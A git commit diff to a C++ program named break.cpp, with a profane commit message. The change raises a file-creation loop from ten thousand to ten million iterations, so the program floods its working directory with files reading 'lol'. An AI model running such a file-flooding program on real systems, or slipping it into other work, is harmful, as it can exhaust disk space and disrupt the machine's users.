57d6ecaa4e5a65e78c161aa366b390fd326714a1
Kostya <gta5kostya@mail.ru>
2023-03-05 14:49:50 +0300

    I FUCK U FUCKING GIT

--- break.cpp
+++ break.cpp
@@ -3,7 +3,7 @@
 #include <string>
 
 int main(){
-	for (int i = 0; i < 10000; i++) {
+	for (int i = 0; i < 10000000; i++) {
 		std::ofstream outfile(std::to_string(i) + ".txt");
 		outfile << "lol" << std::endl;
 		outfile.close();
